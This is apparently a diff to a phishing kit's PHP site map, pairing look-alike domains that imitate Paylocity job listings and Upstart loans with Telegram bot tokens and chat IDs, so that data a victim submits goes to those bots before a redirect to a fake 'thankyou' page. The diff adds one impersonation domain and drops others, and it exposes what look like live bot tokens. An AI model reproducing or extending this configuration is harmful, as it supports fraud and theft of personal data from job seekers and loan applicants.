@@ -12,30 +12,15 @@ $site_map = [
         ],
         "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
     ],
-    'thepaylocity.rf.gd' => [
+
+    'upstarts.onrender.com' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
+            ['token' => '', 'chat_id' => '']
         ],
-        'redirect' => 'https://thepaylocity.rf.gd/cache_site/careers/all-listings.job.34092/thankyou.html'
+        'redirect' => 'https://upstarts.onrender.com/cache_site/thankyou.html'
     ],
-
-    'paylocitylive.42web.io' => [
-        'bots' => [
-            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '7688665277:AAEim49LrUZ3x8zLwQ5pOjDofnsCS4mKFmM', 'chat_id' => '2068911019']
-        ],
-        'redirect' => 'https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html'
-    ],
-
-    'paylocity.page.gd' => [
-        'bots' => [
-            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM', 'chat_id' => '8160582785']
-        ],
-        'redirect' => 'https://paylocity.page.gd/cache_site/careers/all-listings.job.34092/thankyou.html'
-    ],
-
+    
 
     // Add more sites...
 ];
